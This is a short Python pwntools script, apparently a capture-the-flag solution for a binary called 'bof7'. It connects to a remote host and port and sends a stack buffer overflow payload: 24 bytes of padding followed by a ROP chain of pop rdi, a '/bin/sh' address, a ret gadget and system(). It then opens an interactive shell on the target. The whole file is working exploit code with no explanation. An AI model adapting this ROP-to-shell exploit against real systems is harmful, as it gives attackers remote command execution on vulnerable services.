#nc 13.214.30.13 10008

from pwn import *

p = remote('13.214.30.13', '10008')

context = binary = './bof7'

vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)

bin_sh = 0x00404080

payload = b'A'*24
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(bin_sh)
payload += p64(vuln_rop.find_gadget(['ret'])[0])
payload += p64(vuln_elf.symbols.system)
payload += p64(vuln_elf.symbols.notReadFlag) 

print(p.recvline())
p.sendline(payload)
print(p.recvline())
p.interactive()